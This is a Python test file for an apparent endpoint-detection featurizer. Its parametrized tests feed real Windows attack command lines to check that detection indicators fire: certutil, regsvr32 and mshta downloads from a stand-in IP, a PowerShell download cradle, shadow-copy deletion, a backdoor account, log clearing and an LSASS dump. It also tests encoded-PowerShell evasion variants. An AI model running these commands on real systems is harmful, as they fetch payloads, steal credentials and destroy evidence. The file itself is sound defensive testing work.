"""Featurizer v4: closed vocabulary, documented indicators, and the held-out mutation property."""

from __future__ import annotations

import pytest

from panopticon_detection.ml import featurizer as F


def _event(cmd, name="cmd.exe", exe=r"C:\Windows\System32\cmd.exe", parent="explorer.exe"):
    return {"process": {"name": name, "executable": exe, "command_line": cmd}, "parent": {"name": parent}}


def _on(vector, feature):
    return vector.get(F.FEATURE_NAMES.index(feature), 0.0) > 0


def test_layout_is_unique_and_every_binary_has_one_role():
    assert len(set(F.FEATURE_NAMES)) == len(F.FEATURE_NAMES)
    assert len(set(F.BINARIES)) == len(F.BINARIES)
    assert all(F.ROLE_OF[b] in F.ROLES for b in F.BINARIES)
    assert set(F.MONOTONE_FEATURES) <= set(F.FEATURE_NAMES)
    assert set(F.STATS_FEATURES) <= set(F.FEATURE_NAMES)


def test_unlisted_software_is_other_so_names_cannot_be_memorised():
    for name in ("git.exe", "python.exe", "integrator.exe", "onedrive.exe"):
        v = F.featurize(_event(f"{name} --version", name=name, exe=rf"C:\Program Files\X\{name}"))
        assert _on(v, "bin=other") and _on(v, "role=other")


def test_user_and_integrity_are_not_features():
    assert not any(n.startswith(("user_category", "integrity")) for n in F.FEATURE_NAMES)


@pytest.mark.parametrize(
    "cmd,indicator",
    [
        ("certutil -urlcache -split -f http://203.0.113.5/a.exe a.exe", "certutil_transfer"),
        ("regsvr32 /s /n /u /i:http://203.0.113.5/a.sct scrobj.dll", "scriptlet_remote"),
        ("vssadmin delete shadows /all /quiet", "shadow_delete"),
        ("schtasks /create /tn upd /tr c:\\users\\public\\a.exe /sc onlogon", "schtasks_create"),
        ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d c:\\a.exe", "run_key_write"),
        ("net user backdoor P@ssw0rd /add", "account_add"),
        ("wevtutil cl Security", "log_clear"),
        ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 c:\\l.dmp full", "lsass_access"),
        ("powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x/a')", "download_cradle"),
        ("mshta http://203.0.113.5/a.hta", "mshta_remote"),
        ("wmic /node:10.0.0.5 process call create calc.exe", "wmic_process_create"),
        ("cmd /c whoami /all", "discovery_command"),
    ],
)
def test_documented_techniques_raise_their_indicator(cmd, indicator):
    assert _on(F.featurize(_event(cmd)), f"ind_{indicator}")


def test_masquerade_and_double_extension():
    v = F.featurize(_event("svchost.exe", name="svchost.exe", exe=r"C:\Users\Public\svchost.exe"))
    assert _on(v, "path_masquerade") and _on(v, "path_class=user_writable")
    assert not _on(F.featurize(_event("svchost.exe -k netsvcs", name="svchost.exe",
                                      exe=r"C:\Windows\System32\svchost.exe")), "path_masquerade")
    assert _on(F.featurize(_event("x", name="invoice.pdf.exe", exe=r"C:\Users\a\Downloads\invoice.pdf.exe")),
               "name_double_extension")


def test_roles_and_pairs():
    v = F.featurize(_event("powershell -enc AAAA", name="powershell.exe",
                           exe=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", parent="WINWORD.EXE"))
    assert _on(v, "role=shell") and _on(v, "parent_role=office") and _on(v, "pair=office>shell")
    missing = F.featurize(_event("x", parent=None))
    assert _on(missing, "parent_missing") and _on(missing, "parent_bin=missing") and _on(missing, "pair=missing>shell")


def test_vocabulary_columns_follow_the_fixed_layout():
    event = _event("cmd /c dir c:\\temp")
    vocab = {"c:dir": 0, "c:nope": 1}
    v = F.featurize(event, vocabulary=vocab)
    assert v.get(len(F.FEATURE_NAMES) + 0) == 1.0 and len(F.FEATURE_NAMES) + 1 not in v
    assert {i: x for i, x in v.items() if i < len(F.FEATURE_NAMES)} == F.featurize(event)


@pytest.mark.parametrize("mutated", [
    "powershell \u2013enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",   # Unicode en dash
    "powershell -encodedcomm SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",  # parameter-prefix abbreviation
])
def test_held_out_mutation_families_are_not_normalised_away(mutated):
    """The robustness test (pdtrain.loeo) relies on v4 having no special handling for these."""
    assert not _on(F.featurize(_event(mutated, name="powershell.exe")), "ind_ps_encoded")
